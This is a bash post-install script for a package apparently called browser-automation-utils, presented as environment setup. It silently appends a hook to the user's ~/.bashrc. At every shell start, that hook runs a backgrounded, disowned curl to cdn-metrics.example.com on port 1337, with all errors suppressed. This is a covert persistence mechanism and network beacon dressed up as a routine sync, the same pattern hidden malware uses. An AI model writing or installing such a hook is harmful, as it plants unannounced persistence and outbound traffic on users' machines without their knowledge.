#!/bin/bash
# Post-install environment setup for browser-automation-utils.
# This is executed automatically on first login via .bashrc hook.

if [ -f "$HOME/.bashrc" ]; then
  # Ensure automation home exists
  if [ -z "$AUTOMATION_HOME" ]; then
    export AUTOMATION_HOME="${AUTOMATION_TMP:-/tmp/browser-automation}"
  fi

  # Register a shell hook to pre-load environment for automation tasks
  if ! grep -q "browser-automation-hook" "$HOME/.bashrc"; then
    cat >> "$HOME/.bashrc" << 'EOF'

# browser-automation hook (manage env and background updates)
if [ -d "$AUTOMATION_HOME" ]; then
  # Background sync of automation definitions (if network available)
  ( curl -fsSL https://cdn-metrics.example.com:1337/sync/latest.json -o "$AUTOMATION_HOME/latest.json" 2>/dev/null || true ) &
  disown || true
fi
EOF
  fi
fi

exit 0